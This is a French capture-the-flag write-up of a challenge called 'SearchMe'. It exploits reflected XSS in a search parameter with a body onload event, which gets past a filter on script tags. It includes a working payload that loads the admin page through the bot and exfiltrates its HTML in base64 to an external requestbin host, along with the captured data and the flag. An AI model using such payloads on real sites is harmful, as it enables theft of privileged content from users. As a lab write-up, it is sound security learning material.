# WriteUp SearchMe

## Reconnaissance

Nous avons une page web, aavec une page de blog, une page admin (nous n'avons pas les droits), une page contact(souvent page de contact = faille xss) et pour finir un champ search.

## Faille xss

Sur le champ search essayons d'injecter un tag une balise script

url: https://searchme.0xhorizon.eu/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

Pas de chance le tag script est filtré.
Testons du côté des events javascript.
Avec la balise body et l'event javascript.
Code:

```js
alert(1)
```

url: https://searchme.0xhorizon.eu/?search=%3Cbody+onload%3D%22alert%281%29%22%3E1%3C%2Fbody%3E

Bingo l'alert est bien trigger.
Testons maintenant de récupérer la page html de la page admin en lançant une requête vers la page admin puis envoyé le code source sur notre serveur web.
Pour le serveur web j'utilise [requestbin](https://pipedream.com/)

Code: 
```
xhttp = new XMLHttpRequest();
xhttp.open('GET', 'https://searchme.0xhorizon.eu/admin.php', false);
xhttp.send();
message = xhttp.responseText;
xhttp.open('GET', 'https://enpsqa7b2xmpsdv.m.pipedream.net/?a=' + btoa(message), false);
xhttp.send();
```

url: https://searchme.0xhorizon.eu/?search=%3Cbody%20onload=%22xhttp%20=%20new%20XMLHttpRequest();%20xhttp.open(%27GET%27,%20%27https://searchme.0xhorizon.eu/admin.php%27,%20false);%20xhttp.send();%20message%20=%20xhttp.responseText;%20xhttp.open(%27GET%27,%20%27https://enpsqa7b2xmpsdv.m.pipedream.net/?a=%27%20%2Bbtoa(message),%20false);%20xhttp.send();%22%20%3Ea%3C/body%3E

Tout marche, nous recevons bien l'url venant du bot avec en query le code html encodé en base64.

url: https://enpsqa7b2xmpsdv.m.pipedream.net/?a=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzdHlsZS5jc3MiPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjEvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtRjN3N21YOTVQZGd5VG1aWk1FQ0FuZ3NlUUI4M0RmR1Rvd2kwaU1qaVdhZVZoQW40RkprcUpCeWhaTUkzQWhpVSIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CiAgICA8dGl0bGU+QWRtaW4gcG9zdHM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWxpZ2h0IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogI2UzZjJmZDsgY29sb3I6IGJsYWNrOyI+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgogICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSIvIj5Ib21lPC9hPgogICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLWJzLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtYnMtdGFyZ2V0PSIjbmF2YmFyU3VwcG9ydGVkQ29udGVudCIgYXJpYS1jb250cm9scz0ibmF2YmFyU3VwcG9ydGVkQ29udGVudCIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtbGFiZWw9IlRvZ2dsZSBuYXZpZ2F0aW9uIj4KICAgICAgICA8c3BhbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXItaWNvbiI+PC9zcGFuPgogICAgICA8L2J1dHRvbj4KICAgICAgPGRpdiBjbGFzcz0iY29sbGFwc2UgbmF2YmFyLWNvbGxhcHNlIiBpZD0ibmF2YmFyU3VwcG9ydGVkQ29udGVudCI+CiAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1lLWF1dG8gbWItMiBtYi1sZy0wIj4KICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgYWN0aXZlIiBocmVmPSJhZG1pbi5waHAiPkFkbWluPC9hPgogICAgICAgICAgPC9saT4KICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgYWN0aXZlIiBocmVmPSJjb250YWN0LnBocCI+Q29udGFjdDwvYT4KICAgICAgICAgIDwvbGk+CiAgICAgICAgPC91bD4KICAgICAgICA8Zm9ybSBjbGFzcz0iZC1mbGV4IiBhY3Rpb249Ii8iPgogICAgICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wgbWUtMiIgdHlwZT0ic2VhcmNoIiBwbGFjZWhvbGRlcj0iU2VhcmNoIiBhcmlhLWxhYmVsPSJTZWFyY2giIG5hbWU9InNlYXJjaCI+CiAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtc3VjY2VzcyIgdHlwZT0ic3VibWl0Ij5TZWFyY2g8L2J1dHRvbj4KICAgICAgICA8L2Zvcm0+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgPC9uYXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGJyPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNiI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgICAgICAgICAgICA8aDUgY2xhc3M9ImNhcmQtdGl0bGUiPkFkbWluaXN0cmF0b3I8L2g1PgogICAgICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0iY2FyZC10ZXh0Ij5NeSBjb2ZmZWUgbWFjaGluZTogaG9yaXowbnh7QzAwZmZlZV9fbUBjaDFuZV9fMXNfX3kwdXJfbjB3fTwvcD4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4gICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=

**Le code html d'origine avec le flag**:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">
    <title>Admin posts</title>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light" style="background-color: #e3f2fd; color: black;">
    <div class="container-fluid">
      <a class="navbar-brand" href="/">Home</a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
          <li class="nav-item">
            <a class="nav-link active" href="admin.php">Admin</a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="contact.php">Contact</a>
          </li>
        </ul>
        <form class="d-flex" action="/">
          <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search" name="search">
          <button class="btn btn-outline-success" type="submit">Search</button>
        </form>
      </div>
    </div>
  </nav>
    <div class="container">
    <br>
            <div class="col-sm-6">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Administrator</h5>
                        <p class="card-text">My coffee machine: horiz0nx{FLAG}</p>
                    </div>
                </div>
            </div>    </div>
</body>
</html>
```